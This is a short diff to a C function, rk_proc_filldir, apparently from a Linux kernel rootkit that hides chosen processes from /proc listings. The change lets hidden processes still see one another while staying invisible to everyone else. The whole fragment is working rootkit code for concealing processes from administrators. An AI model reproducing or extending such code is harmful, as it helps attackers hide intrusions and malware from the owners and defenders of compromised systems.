@@ -25,7 +25,7 @@ int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
 
     if (pid != 0)
     {
-        if (is_hidden_proc(pid))
+        if (is_hidden_proc(pid) && !is_hidden_proc(current->pid))
         {
             return 0;
         }
